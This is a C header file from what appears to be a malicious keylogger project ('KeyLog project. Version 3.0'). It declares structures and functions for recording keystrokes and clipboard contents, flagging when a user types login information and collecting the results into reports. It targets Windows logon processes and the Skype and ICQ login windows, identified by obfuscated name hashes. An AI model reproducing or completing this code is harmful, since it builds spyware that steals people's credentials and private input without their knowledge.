//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KeyLog project. Version 3.0
//	
// module: keylog.h
// $Revision: 59 $
// $Date: 2014-12-17 19:36:18 +0300 (Ср, 17 дек 2014) $
// description:
//	KeyLog main definition file.

#define _ENABLE_LOGOFF_NOTIFICATION			// enables session end notification

#define	MAX_CLIPBOARD_TEXT			0x2000	// chars
#define	MAX_WINDOW_TEXT				1024	// chars
#define	MAX_KEY_BUFFER_SIZE			0x2000	// chars
#define	MAX_REPORT_BUFFER_SIZE		0x10000	// bytes

#define	KEYUP_MASK					0x80000000
#define	CAPSLOCK_MASK				0x40000000

#define KEY_MASK_CAPSLOCK			1
#define	KEY_MASK_SHIFT				2
#define	KEY_MASK_CTRL				4

#pragma pack(push)
#pragma pack(1)
// Following 2 structures MUST have the same size and the same field offset on x86 and x64 machines because
//	they will be transferred through a pipe from 32-bit client to 64-bit server

// GUI client information
typedef struct _CLIENT_INFO
{
	ULONG	ProcessId;
	ULONG	ThreadId;
	union {
		HWND	CurrentWindow;
		ULONGLONG	Padding0;
	};
	union {
		HWND	ParentWindow;
		ULONGLONG	Padding1;
	};
	BOOL Login; // user typing login info
} CLIENT_INFO, *PCLIENT_INFO;

// KeyLog public structures
typedef struct _KEY_INFO
{
	CLIENT_INFO	Client;
	ULONG		Flags;
	USHORT		wChar;
	LPSTR       clipboard;
} KEY_INFO, *PKEY_INFO;

#pragma pack(pop)


typedef struct _CLIPBOARD_ENTRY
{
	LIST_ENTRY	qLink;
	FILETIME	Time;
	LPSTR       Buffer;
}CLIPBOARD_ENTRY,*PCLIPBOARD_ENTRY;

typedef struct _KEY_CONTEXT
{
	FILETIME	Time;	
	ULONG		Count;
	ULONG		Mask;
	WCHAR		ProcessPath[MAX_PATH];

	WCHAR		WindowText[MAX_WINDOW_TEXT];
	WCHAR		KeyBuffer[MAX_KEY_BUFFER_SIZE];

	BOOL        bDirty;		// just created
	BOOL		bActive;	// active, collecting data
	LIST_ENTRY  ClipboardChain;
} KEY_CONTEXT, *PKEY_CONTEXT;

// KeyLog special host processes
#define	HOST_WININIT		0x34486263
#define	HOST_WINLOGON		0xf3ad5a3b
#define HOST_SKYPE			0x4e66ce96 //SKYPE.EXE
#define HOST_ICQ			0x7dd77bf7 //ICQ.EXE

// class name hash
#define WINDOW_IES			0x552b460f //Internet Explorer_Server
#define WINDOW_ICQ8			0xbdf9c9cd //MRA_LOGIN_WINDOW
#define WINDOW_ICQ7			0xa61b1cac //__oxFrame.class__
#define WINDOW_LOGIN_FORM	0x6ff0a875 //TLoginForm, skype

#define CAPTION_ICQ			0xb8cded06 // "ICQ"
#define CAPTION_SKYPE		0xd51b9fb1 // Skype


extern HMODULE			g_CurrentModule;
extern BOOL	volatile	g_bLoggerEnabled;
extern LPWSTR			g_pKeyProcessList;

//
//	Library initialization function. Must be called first.
//
WINERROR KeyLogInit(VOID);


//
//	Library cleanup function.
//
VOID KeyLogCleanup(VOID);


//
//	Enables/disables keylogger
//
VOID KeyLogEnable(BOOL bEnable);


//
//	Enables/disables clipboard tracker
//
VOID ClipTrackEnable(BOOL bEnable);


//
//	Adds a new pressed key information into the key store.
//
WINERROR KeyStoreAdd(
	PKEY_INFO	pKeyInfo
	);


//
//	Creates key store report.
//
WINERROR KeyStoreReport(
	PWCHAR*	ppReport,
	PULONG	pLength,
	BOOL	bDelete
	);


//
//	Sets lists of processes for the key log.
//
VOID KeyStoreSetProcessList(
	LPTSTR pKeyProcessList
	);
